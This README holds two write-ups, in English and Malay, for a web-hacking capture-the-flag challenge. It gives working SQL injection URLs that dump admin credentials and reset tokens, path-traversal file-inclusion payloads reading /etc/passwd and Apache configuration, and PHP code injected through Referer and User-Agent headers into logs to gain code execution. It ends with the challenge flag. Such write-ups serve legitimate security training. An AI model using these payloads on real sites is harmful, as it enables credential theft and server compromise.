# TBD.My Web Hacking Challenge
Source code for TBD.My Web Challenge. https://forum.tbd.my/topic/13479/tbd-challenge-advance-web-hacking

# Write Up by @arith

Step 1: 

SQL injection

`http://tbd-challange.rz.my/post.php?id=0%20union%20select%201,2,group_concat%28username,password,email,token%29,4%20from%20tbl_admin`

Then, login, if cannot u can reset password using token.

Step 2:
Local File Inclusion

But where is the admin login? Basic!!! robots.txt

`http://tbd-challange.rz.my/4dm1nz/index.php?page=LFI PAYLOAD`

1) read apache2.conf

`http://tbd-challange.rz.my/4dm1nz/index.php?page=../../../../../../../../../../../../../../../../../etc/apache2/apache2.conf`

2) read custom error logger

- `http://tbd-challange.rz.my/4dm1nz/index.php?page=../../../../../../../../../../../../../../../../../usr/sbin/apache-error-logger.sh`

- `http://tbd-challange.rz.my/4dm1nz/index.php?page=../../../../../../../../../../../../../../../../../var/www/html/logs/error_2016-05-25-175.139.36.132.log`

Notice that if page ERROR, there will be referer.

Step 3:
Inject payload on the referer and load the log using LFI.

`http://tbd-challange.rz.my/aaa.php`

with

`Referer:<?php $dir    = '/var/www/html'; $files = scandir($dir); print_r($files);?>`

Step 4:
Load the log again and w00t..
`http://tbd-challange.rz.my/4dm1nz/index.php?page=../../../../../../../../../../../../../../../../../var/www/html/logs/error_2016-05-25-175.139.36.132.log`

`[Thu May 26 09:53:26.439970 2016] [:error] [pid 5736] [client 175.139.36.132:51459] script '/var/www/html/aaa.php' not found or unable to stat, referer: Array ( [0] => . [1] => .. [2] => .flag1z2ez4u [3] => .htaccess [4] => 4dm1nz [5] => LICENSE [6] => README.md [7] => about.php [8] => b3nd3r4ch411 [9] => bbcode.php [10] => config.php [11] => contact.php [12] => css [13] => fonts [14] => img [15] => index.php [16] => init.php [17] => js [18] => less [19] => logs [20] => mail [21] => noscanner.txt [22] => post.php [23] => robots.txt [24] => upfile ) `

Final step:
`http://tbd-challange.rz.my/.flag1z2ez4u`


# Write Up @akmalhisyam 

https://dl.dropboxusercontent.com/u/28476597/writeup_rempah.html

- Dari initial jalan-jalan, ada SQL injection kat `post.php?id=`
```
http://tbd-challenge.rz.my/post.php?id=47%27

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1
```

- Dari robots.txt, kita dapat tau admin page ada kat /4dm1nz
```
User-agent: *
Disallow: /
Disallow: /4dm1nz
Disallow: /mail
Disallow: /b3nd3r4ch411

# Penafian
# Web Ini dicipta untuk TBD.My Challenge.
# URL: https://forum.tbd.my/topic/13479/tbd-challenge-advance-web-hacking
# Good Luck :)
# - Rempah
```
- Bila bukak http://tbd-challenge.rz.my/4dm1nz/ kita akan jumpa satu login form as expected.
- Tapi kita tak tau login.
- Kat page ni ada feature untuk reset password (http://tbd-challenge.rz.my/4dm1nz/forgot-password.php) dan verify token (http://tbd-challenge.rz.my/4dm1nz/forgot-password.php?action=verify) untuk reset password
- So kita boleh reset password, dan dapatkan token dari DB melalui SQL injection
  1. Pergi page reset password
  2. Masukkan username admin
  3. SQLI - `http://tbd-challenge.rz.my/post.php?id=-27%20union%20select%20all%201,2,group_concat(token),4%20%20from%20tbl_admin%20where%20id=1--`
  4. Pergi page verify token, masukkan username, token dan new password
- Login guna password baru tadi
- Hasil dari jalan-jalan di page admin, sebuah LFI telah ditemui `http://tbd-challenge.rz.my/4dm1nz/index.php?page=../../../../../../etc/passwd`
  - Cubaan untuk view config.php gagal kerana PHP pada page tersebut di-execute instead of displayed. Sigh
- Daripada file `/etc/apache2/sites-enabled/000-default.conf` kita dapat tau apache guna custom scripts untuk logging; `/usr/sbin/apache-error-logger.sh` dan `/usr/sbin/apache-access-logger.sh`
- Kedua-dua skrip ni akan log error dan acces ke dalam file `/var/www/html/logs/{error|access}_$IP.log
Kalau kita tengok dalam kita punya access log`, kita akan dapati maklumat yang di-log ialah IP, tarikh-masa, URL dan juga user-agent
- Oleh kerana user agent adalah input yang boleh dikawal oleh user, ini bermakna kita boleh letakkan kod PHP dan gunakan LFI tadi untuk execute!
- Mari kita test
  1. Ubah user agent menjadi `<?php phpinfo(); ?>`
  2. Browse satu page. Saya guna `http://tbd-challenge.rz.my/css/clean-blog.min.css` sebab ini adalah single 'page' untuk mengelakkan 'semak' dalam log.
  3. View log guna LFI. eg `http://tbd-challenge.rz.my/4dm1nz/index.php?page=../../../../../../var/www/html/logs/access_124.211.219.193.log`
  4. Kita akan dapati phpinfo terpapar
- Cubaan untuk menggunakan `system()`/`exec()`/`passthru()` untuk run ls gagal kerana ia telah di-disable-kan (rujuk error_IP.log)
- Jadi saya cuba menggunakan `glob()`.` <?php foreach(glob('*')as$a){echo $a;echo "\n";} ?>` dan berjaya!
```
124.211.219.193 - - [29/May/2016:04:41:44 -0400] "GET /4dm1nz/plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js HTTP/1.1" 200 57056 "http://tbd-challenge.rz.my/4dm1nz/index.php?page=../../../../../../var/www/html/logs/access_124.211.219.193.log" "bootstrap
dist
forgot-password.php
index.php
init.php
login.php
logout.php
pages
plugins
"
```

- Setelah jauh menjelajah sehingga ke `../../../backups`, saya masih tidak menemui apa-apa.
- Kemudian baru saya perasan, glob tidak menyenaraikan .htaccess di `../` walaupun ia wujud. Ini bermakna ia tidak menyenaraikan hidden files by default!
- Kemudian saya cuba listkan lagi sekali `../` menggunakan `<?php foreach(glob('../.*')as$a){echo $a;echo "\n";} ?>`

```
124.211.219.193 - - [29/May/2016:05:49:24 -0400] "GET /css/clean-blog.min.css HTTP/1.1" 200 2119 "-" "../.
../..
../.flag1z2ez4u
../.htaccess
"
```

- Bukak http://tbd-challenge.rz.my/.flag1z2ez4u
`flag:{86552b2996b2a6ed0f5c8e345eaf074c}`
